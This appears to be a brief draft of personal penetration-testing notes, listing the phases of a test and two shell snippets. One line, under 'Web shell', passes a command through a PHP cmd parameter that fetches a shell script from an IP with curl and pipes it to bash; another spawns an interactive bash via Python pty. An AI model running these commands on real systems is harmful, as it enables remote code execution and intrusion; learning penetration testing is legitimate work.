---
Title: Penetration Test
description: 
draft: True
spelling: 
---

## Flow

  VA -> PT

  1. Planning and Reconnaissance
  2. Scanning
  3. Gaining System Access
  4. Persistent Access
  5. Analysis and Reporting

### SQL injection

### Web shell

``` shell
Dysco.php?cmd=curl ${local_ip}:8000/shell.sh|bash
```

### Shell

``` shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
